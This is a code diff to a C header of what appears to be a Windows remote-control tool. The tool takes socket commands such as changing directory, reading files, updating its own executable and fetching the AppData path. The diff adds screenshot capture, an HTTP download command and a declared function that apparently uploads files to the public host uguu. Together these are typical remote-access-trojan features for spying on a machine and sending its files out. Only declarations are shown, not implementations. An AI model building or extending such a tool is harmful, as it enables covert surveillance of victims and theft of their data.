@@ -8,6 +8,7 @@
 #include <winsock2.h>       // Socket connection
 #include <windows.h>        // WinAPI calls
 #include <ws2tcpip.h>       // TCP-IP Sockets
+#include <winhttp.h>
 #include <stdio.h>
 #include <string.h>
 #include <shlobj.h>
@@ -19,6 +20,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "winhttp.lib")
 
 
 
@@ -63,7 +65,9 @@ typedef enum
     CMD_CD,
     CMD_CAT,
     CMD_UPDATE_EXE,
-    CMD_GET_APPDATA_PATH
+    CMD_GET_APPDATA_PATH,
+    CMD_TAKE_SCREENSHOT,
+    CMD_HTTP_DOWNLOAD,
 }CommandType;
 typedef struct
 {
@@ -145,5 +149,12 @@ int UnicodeToAnsi(const wchar_t* unicodeStr, char* ansiStr, int bufferSize);
 int AnsiToUnicode(const char* ansiStr, wchar_t* unicodeStr, int bufferSize);
 int Utf8ToAnsi(const char* utf8Str, char* ansiStr, int bufferSize);
 int AnsiToUtf8(const char* ansiStr, char* utf8Str, int bufferSize);
+
+
+//screenshot.c
+int take_screenshot(char* out_path, int path_len);
+
+//http_upload.c
+char* upload_to_uguu(const char* file_path);
   
 #endif
